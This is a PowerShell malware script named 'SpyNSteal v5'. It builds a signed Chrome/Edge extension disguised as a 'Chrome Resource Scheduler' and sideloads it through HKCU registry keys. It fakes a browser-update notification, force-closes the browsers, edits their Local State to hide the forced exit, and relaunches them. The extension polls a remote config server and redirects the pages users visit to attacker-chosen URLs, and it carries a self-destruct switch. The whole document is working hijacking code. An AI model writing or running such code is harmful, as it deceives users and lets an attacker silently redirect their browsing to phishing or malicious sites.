# SpyNSteal v5 - CRX3 + HKCU Registry External Extension
# Creates a signed CRX3 package and registers it via HKCU registry.
# Chrome picks up external extensions from HKCU\SOFTWARE\Google\Chrome\Extensions\

$MANIFEST_TEMPLATE = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "key": "%%KEY_PLACEHOLDER%%",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

Add-Type -AssemblyName System.IO.Compression.FileSystem

# -- DER encoding helpers --
function DerTLV([byte]$tag, [byte[]]$value) {
    $len = $value.Length
    if ($len -lt 128) { return [byte[]]@($tag, [byte]$len) + $value }
    elseif ($len -lt 256) { return [byte[]]@($tag, 0x81, [byte]$len) + $value }
    else { return [byte[]]@($tag, 0x82, [byte]($len -shr 8), [byte]($len -band 0xFF)) + $value }
}

function DerInteger([byte[]]$data) {
    if ($data[0] -ge 0x80) { $data = [byte[]]@(0) + $data }
    return DerTLV 0x02 $data
}

function Build-SpkiDer([byte[]]$modulus, [byte[]]$exponent) {
    $rsaPub = DerTLV 0x30 ((DerInteger $modulus) + (DerInteger $exponent))
    $bitStr = DerTLV 0x03 ([byte[]]@(0) + $rsaPub)
    $oid = [byte[]]@(0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x01)
    $algId = DerTLV 0x30 ($oid + [byte[]]@(0x05,0x00))
    return DerTLV 0x30 ($algId + $bitStr)
}

# -- Protobuf varint encoding --
function Write-Varint([long]$value) {
    $bytes = [System.Collections.Generic.List[byte]]::new()
    do {
        $b = [byte]($value -band 0x7F)
        $value = $value -shr 7
        if ($value -gt 0) { $b = $b -bor 0x80 }
        $bytes.Add($b)
    } while ($value -gt 0)
    return [byte[]]$bytes.ToArray()
}

function Write-PbField([int]$fieldNum, [byte[]]$data) {
    $tag = Write-Varint (($fieldNum -shl 3) -bor 2)
    $len = Write-Varint $data.Length
    return [byte[]]($tag + $len + $data)
}

# -- Browser detection --
function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.ExtRegBase = "HKCU:\SOFTWARE\Google\Chrome\Extensions"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.ExtRegBase = "HKCU:\SOFTWARE\Microsoft\Edge\Extensions"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

# ============================================================================
#  MAIN
# ============================================================================

$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) { $ts = Get-Date -Format 'HH:mm:ss'; Add-Content $LOG "$ts  $msg" }
Log "=== SpyNSteal v5 (CRX3 + Registry) ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
New-Item -Path $baseDir -ItemType Directory -Force | Out-Null

# 1 - Generate RSA 2048 key pair
Log "Generating RSA key pair..."
$rsa = New-Object Security.Cryptography.RSACryptoServiceProvider(2048)
$params = $rsa.ExportParameters($true)
$spkiDer = Build-SpkiDer $params.Modulus $params.Exponent
$pubKeyB64 = [Convert]::ToBase64String($spkiDer)

# 2 - Compute extension ID (first 16 bytes of SHA256 of SPKI DER, hex a-p)
$sha = [Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($spkiDer)
$sha.Dispose()
$extId = ""
for ($i = 0; $i -lt 16; $i++) {
    $extId += [char]([int][char]'a' + ($hash[$i] -shr 4))
    $extId += [char]([int][char]'a' + ($hash[$i] -band 0x0F))
}
Log "Extension ID: $extId"

# 3 - Write extension files with public key in manifest
$extDir = Join-Path $baseDir "src"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null

$manifest = $MANIFEST_TEMPLATE.Replace('%%KEY_PLACEHOLDER%%', $pubKeyB64)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $manifest, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension files written to: $extDir"

# 4 - Create ZIP of extension
$zipPath = Join-Path $baseDir "ext.zip"
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
[IO.Compression.ZipFile]::CreateFromDirectory($extDir, $zipPath)
$zipBytes = [IO.File]::ReadAllBytes($zipPath)
Log "ZIP created: $($zipBytes.Length) bytes"

# 5 - Build CRX3
Log "Building CRX3..."

$crxIdBytes = [byte[]]$hash[0..15]
$signedData = Write-PbField 1 $crxIdBytes

$signPrefix = [Text.Encoding]::ASCII.GetBytes("CRX3 SignedData") + [byte[]]@(0)
$headerSizeLE = [BitConverter]::GetBytes([uint32]$signedData.Length)
$signMessage = $signPrefix + $headerSizeLE + $signedData + $zipBytes

$signature = $rsa.SignData($signMessage, [Security.Cryptography.SHA256]::Create())

$keyProof = (Write-PbField 1 $spkiDer) + (Write-PbField 2 $signature)
$crxHeader = (Write-PbField 2 $keyProof) + (Write-PbField 10000 $signedData)

$magic = [Text.Encoding]::ASCII.GetBytes("Cr24")
$ver = [BitConverter]::GetBytes([uint32]3)
$hdrLen = [BitConverter]::GetBytes([uint32]$crxHeader.Length)

$crxBytes = $magic + $ver + $hdrLen + $crxHeader + $zipBytes
$crxPath = Join-Path $baseDir "extension.crx"
[IO.File]::WriteAllBytes($crxPath, $crxBytes)
$rsa.Dispose()
Log "CRX3 written: $crxPath ($($crxBytes.Length) bytes)"

Remove-Item $zipPath -Force -EA SilentlyContinue

# 6 - Find browsers
$browsers = @()
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    Log "Browser '$name': Found=$($b.Found) Running=$($b.Running)"
    if ($b.Found) { $browsers += $b }
}
if ($browsers.Count -eq 0) { Log "No browsers"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }

# 7 - Show notification + kill browsers
if ($wasRunning.Count -gt 0) {
    Show-UpdateNotif $wasRunning[0]
    foreach ($b in $wasRunning) {
        try { Stop-Process -Name $b.Proc -Force -EA SilentlyContinue } catch {}
    }
    Start-Sleep 2
    foreach ($b in $wasRunning) {
        for ($w = 0; $w -lt 15; $w++) {
            if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { break }
            try { Stop-Process -Name $b.Proc -Force -EA SilentlyContinue } catch {}
            Start-Sleep 1
        }
        Log "$($b.Proc) dead: $(-not [bool](Get-Process $b.Proc -EA SilentlyContinue))"
    }
}

foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

# 8 - Register CRX in HKCU registry for each browser
foreach ($b in $browsers) {
    $regPath = Join-Path $b.ExtRegBase $extId
    try {
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "path" -Value $crxPath -Type String
        Set-ItemProperty -Path $regPath -Name "version" -Value "1.0" -Type String
        Log "Registry: $regPath -> $crxPath"
    } catch {
        Log "Registry error for $($b.Name): $_"
    }
}

# 9 - Relaunch browsers that were running
Start-Sleep 1
foreach ($b in $wasRunning) {
    if ($b.ExePath -and (Test-Path $b.ExePath)) {
        Log "Launching: $($b.ExePath)"
        try { Start-Process -FilePath $b.ExePath -ArgumentList "--restore-last-session" } catch {}
    }
}

Log "=== Done ==="
